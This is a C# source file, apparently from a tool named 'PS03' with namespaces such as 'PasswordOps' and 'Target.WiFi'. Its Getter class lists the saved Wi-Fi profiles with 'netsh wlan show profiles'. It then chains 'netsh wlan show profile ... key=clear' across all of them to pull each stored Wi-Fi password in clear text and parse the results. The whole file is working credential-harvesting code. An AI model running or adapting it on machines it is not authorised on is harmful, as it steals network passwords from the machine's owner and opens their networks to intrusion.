using System.Collections.Concurrent;
using System.Collections.Generic;
using PS03.PasswordOps.WiPS.WiFI;

namespace PS03.Target.WiFi.CmdLineExecutor.LocalOps
{
    internal class Getter
    {

        private readonly DOP _dataOps = new DOP();


        public List<Profile> GetWIfiProfiles()
        {
            var cmd = new NewCommand("netsh wlan show profiles");
            string rawProfiles = cmd.Execute();
            if (rawProfiles.StartsWith("The Wireless"))
                return new List<Profile>();

            List<Profile> profiles = _dataOps.ExtractProfiles(rawProfiles);
            string getPassCmd = "";


            for (int i = 0; i < profiles.Count; i++)
            {
                getPassCmd += "netsh wlan show profile name=\"" + profiles[i].Action + "\"" + " key=clear";
                if (i+1 != profiles.Count)
                    getPassCmd += " && ";

            }
         
            var PwCmd = new NewCommand(getPassCmd);
            var rawPasswordProfiles = PwCmd.Execute();
            var Cp = _dataOps.GetClearProfiles(rawPasswordProfiles, profiles);

            return Cp;

        } 


    }
}